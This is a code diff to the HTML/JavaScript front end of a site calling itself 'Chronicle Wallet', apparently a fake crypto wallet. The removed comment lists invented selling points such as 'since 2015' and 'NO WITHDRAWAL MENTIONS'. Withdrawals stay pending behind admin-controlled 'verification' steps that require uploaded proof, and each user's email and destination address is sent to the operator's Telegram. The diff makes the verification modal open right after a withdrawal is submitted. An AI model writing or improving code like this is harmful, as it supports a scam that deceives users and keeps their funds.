@@ -287,7 +287,7 @@
                 </table>
             </div>
 
-            <!-- DETAILED LANDING ARTICLE (SINCE 2015, WALLET ID CRN-XXX, AI ASSISTANT, 24/7 SUPPORT, NO WITHDRAWAL MENTIONS) -->
+            <!-- DETAILED LANDING ARTICLE -->
             <div class="card" id="landing-article-card" style="background: linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px solid var(--border); line-height: 1.7;">
                 <h2 style="color: var(--primary); margin-bottom: 1rem; font-size: 1.4rem;">Welcome to Chronicle Wallet: Your Trusted Global Web3 Vault Since 2015</h2>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
@@ -1395,7 +1395,6 @@
             const accName = selectedWithdrawMethodName === 'Bank Transfer' ? document.getElementById('withdraw-acc-name').value : '';
             const destAddr = document.getElementById('withdraw-addr').value;
 
-            // CORRECT WITHDRAWAL PIPELINE LOGIC
             const firstStep = actionSteps.length > 0 ? actionSteps[u.stepIdx || 0] : null;
             const initialStatus = firstStep ? `PENDING (${firstStep.title.toUpperCase()})` : "PENDING (REVIEW)";
 
@@ -1413,11 +1412,15 @@
             u.activeTxId = newTx.id;
             if (u.stepIdx === undefined) u.stepIdx = 0;
 
-            saveState(); updateBalanceUI();
+            saveState(); 
+            updateBalanceUI();
             showNotification("Withdrawal Initiated", `Withdrawal of $${amt.toFixed(2)} submitted to verification pipeline.`, "💳");
             
             sendTelegramAlert(`💳 <b>NEW WITHDRAWAL INITIATED</b>\n\n👤 <b>User:</b> ${u.email}\n💰 <b>Amount:</b> $${amt.toFixed(2)}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}\n⚙️ <b>Initial Status:</b> ${initialStatus}`);
-            alert(`Withdrawal of $${amt.toFixed(2)} initiated successfully! Please check your transaction history and complete any required action steps.`);
+            
+            // POP UP WITHDRAWAL STEP MODAL IMMEDIATELY
+            alert(`Withdrawal of $${amt.toFixed(2)} initiated successfully! Please complete the required verification step below.`);
+            openActionModal();
         }
 
         // --- ACTION / PROOF SUBMISSION MODAL FOR USERS ---
@@ -1461,7 +1464,7 @@
 
             const reader = new FileReader();
             reader.onload = function(evt) {
-                proofQueue.push({
+                const newProofObj = {
                     id: Date.now(),
                     user: u.email,
                     stepIdx: u.stepIdx || 0,
@@ -1470,7 +1473,9 @@
                     statusMsg: step.statusMsg,
                     timerMinutes: step.timerMinutes || 2,
                     image: evt.target.result
-                });
+                };
+
+                proofQueue.push(newProofObj);
 
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 if (tx) tx.status = "PENDING (SUBMITTED / WAITING ADMIN)";
